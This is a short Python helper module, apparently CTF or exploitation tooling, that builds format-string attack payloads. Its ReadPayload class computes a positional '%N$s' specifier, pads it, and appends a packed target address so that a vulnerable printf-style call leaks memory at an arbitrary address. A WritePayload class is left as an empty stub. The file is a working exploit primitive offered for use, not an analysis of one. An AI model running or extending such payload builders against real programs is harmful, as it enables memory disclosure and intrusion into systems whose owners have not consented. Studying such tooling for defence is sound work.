#!/usr/bin/env python3
import struct


class NullByteException(Exception):
    pass


class PayloadSettings:
    def __init__(self, offset, padding=0, address_fmt='@I', null_bytes=True):
        '''
        Args:
            offset (int): The offset of your buffer
            padding (int): The needed padding
            address_fmt (string): The format for an address (see struct.pack)
            null_bytes (bool): Null bytes are allowed
        '''
        assert 0 <= padding <= 3
        self.offset = offset
        self.padding = padding
        self.address_fmt = address_fmt
        self.null_bytes = null_bytes

    def padding_byte(self):
        return b'\x00' if self.null_bytes else b'\xff'

    def check_null_bytes(self, payload):
        if not self.null_bytes and b'\x00' in payload:
            raise NullByteException('generated payload contains a null byte')


class ReadPayload:
    '''
    Read a null-terminated string at `address`
    '''

    def __init__(self, address):
        self.address = address

    def generate(self, settings, start_len=0):
        '''
        Generate a format string to read at `address`

        Args:
            settings (PayloadSettings): Settings for the payload
            start_len (int): The length of already printed data

        Returns:
            The payload to read at `address`
        '''
        offset = settings.offset
        offset += 3 # %x$s + padding

        # start_len
        if start_len % 4 == 0:
            offset += start_len // 4
        else:
            offset += start_len // 4 + 1

        payload = b'%' + str(offset).encode('ascii') + b'$s'
        payload += settings.padding_byte() * (settings.padding + 4 * (offset - settings.offset) - start_len - len(payload))
        payload += struct.pack(settings.address_fmt, self.address)
        settings.check_null_bytes(payload)
        return payload


class WritePayload:
    pass # TODO
